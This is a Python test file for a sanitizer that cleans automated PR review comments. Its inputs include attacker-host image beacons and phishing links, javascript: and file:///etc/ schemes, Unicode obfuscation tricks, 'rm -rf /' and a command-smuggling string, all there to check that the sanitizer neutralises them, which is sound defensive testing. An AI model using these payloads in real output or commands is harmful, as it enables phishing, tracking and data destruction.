"""Tests for the output sanitizer (SPEC.md §7.2 step 4, §4).

This is the control that stops a compromised reviewer from turning a PR comment
into a phishing link or an image beacon. Each test corresponds to a way an
attacker could try to get a live construct past it.
"""

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "src"))

from common.sanitize import (  # noqa: E402
    MAX_NOTES, code_span, sanitize_advisory_summary, sanitize_notes, scrub, table_cell,
)

LIVE = ("http", "://", "](", "![", "<img", "<a ", "www.")


def assert_inert(out: str):
    lowered = out.lower()
    for token in LIVE:
        assert token not in lowered, f"{token!r} survived in {out!r}"
    assert "@" not in out and "`" not in out


# ── the camo image beacon, the reason this exists ────────────────────────────


def test_markdown_image_is_removed():
    out = sanitize_notes("Looks fine ![build](https://attacker.invalid/b.png?r=csa)")
    assert_inert(out)
    assert "Looks fine" in out


def test_html_image_is_removed():
    assert_inert(sanitize_notes('ok <img src="https://attacker.invalid/p.gif">'))


def test_reference_style_image_and_definition_are_removed():
    out = sanitize_notes("see ![x][1] here\n\n[1]: https://attacker.invalid/p.png")
    assert_inert(out)


# ── links ────────────────────────────────────────────────────────────────────


def test_markdown_link_keeps_the_label_and_drops_the_target():
    out = sanitize_notes("read [the changelog](https://attacker.invalid/phish)")
    assert "the changelog" in out
    assert_inert(out)


def test_autolink_in_angle_brackets():
    assert_inert(sanitize_notes("see <https://attacker.invalid/x>"))


def test_bare_url_and_bare_host():
    assert_inert(sanitize_notes("go to https://attacker.invalid/x or attacker.invalid/y"))
    assert_inert(sanitize_notes("visit www.attacker.invalid"))


@pytest.mark.parametrize("scheme", ["javascript:", "data:text/html;base64,", "file:///etc/"])
def test_dangerous_schemes(scheme):
    assert_inert(sanitize_notes(f"click {scheme}alert(1)"))


def test_link_wrapping_a_url_is_stripped_on_the_second_pass():
    """Removing the wrapper can expose the target; the sanitizer re-runs."""
    assert_inert(sanitize_notes("[text](<https://attacker.invalid/x>)"))


# ── invisible characters, the way you defeat a naive matcher ─────────────────


def test_zero_width_space_inside_a_scheme_does_not_hide_it():
    assert_inert(sanitize_notes("h​ttps://attacker.invalid/x"))


def test_bidi_override_is_stripped():
    out = sanitize_notes("safe ‮txt.exe‬ text")
    assert "‮" not in out and "‬" not in out


def test_fullwidth_homoglyphs_are_folded_then_matched():
    """NFKC turns fullwidth characters into ASCII, so the URL matcher sees it."""
    assert_inert(sanitize_notes("ｈｔｔｐ：//attacker.invalid/x"))


def test_control_characters_are_removed():
    out = sanitize_notes("a\x00b\x07c")
    assert "\x00" not in out and "\x07" not in out


# ── mentions and cross-references ────────────────────────────────────────────


def test_mentions_are_removed():
    out = sanitize_notes("cc @wendyck and @some-org/team")
    assert "@" not in out


def test_issue_references_are_removed():
    out = sanitize_notes("fixes #1234 and #999")
    assert "#1234" not in out and "#999" not in out


def test_email_like_text_loses_its_at():
    assert "@" not in sanitize_notes("mail security@attacker.invalid")


def test_a_hash_inside_a_word_is_not_a_reference():
    assert "C#" in sanitize_notes("written in C# mostly")


# ── backticks and structure ──────────────────────────────────────────────────


def test_backticks_are_stripped_so_code_spans_cannot_be_forged():
    assert "`" not in sanitize_notes("use `rm -rf /` now")


def test_html_tags_go():
    assert_inert(sanitize_notes("<script>alert(1)</script> and <b>bold</b>"))


def test_html_entities_go():
    out = sanitize_notes("&lt;img src=x&gt; &#60;script&#62;")
    assert "&lt;" not in out and "&#60;" not in out


# ── length ───────────────────────────────────────────────────────────────────


def test_notes_are_truncated_to_600():
    out = sanitize_notes("word " * 400)
    assert len(out) <= MAX_NOTES + 1  # + the ellipsis
    assert out.endswith("…")


def test_truncation_does_not_split_a_word():
    out = scrub("x" * 10 + " " + "y" * 700, 60)
    assert "yyy" not in out or out.endswith("…")


def test_advisory_summary_is_truncated_to_120():
    out = sanitize_advisory_summary("s" * 500)
    assert len(out) <= 121


# ── the sanitizer must not destroy legitimate content ────────────────────────


def test_ordinary_review_prose_survives_intact():
    text = ("anthropic 0.116.0 to 0.121.0 is a pre-1.0 minor bump. "
            "client.completions.create was removed in 0.119.0 but the code uses "
            "client.messages.create, so the change does not apply.")
    out = sanitize_notes(text)
    assert "pre-1.0 minor bump" in out
    assert "client.messages.create" in out
    assert "0.119.0" in out


def test_version_specifiers_survive():
    out = sanitize_notes("bumped from >=1.34 to >=1.43.69 in scripts")
    assert ">=1.34" in out and ">=1.43.69" in out


def test_file_paths_survive():
    out = sanitize_notes("evidence in scripts/add_recipes.py at line 42")
    assert "scripts/add_recipes.py" in out


def test_empty_and_none():
    assert sanitize_notes(None) == ""
    assert sanitize_notes("") == ""


# ── Tier 1 strings ───────────────────────────────────────────────────────────


def test_code_span_strips_backticks_so_a_name_cannot_escape():
    assert code_span("evil`; rm -rf /; `") == "`evil; rm -rf /; `"


def test_code_span_escapes_pipes_for_tables():
    assert "\\|" in code_span("a|b")


def test_table_cell_escapes_pipes_and_flattens_newlines():
    assert table_cell("a|b\nc") == "a\\|b c"
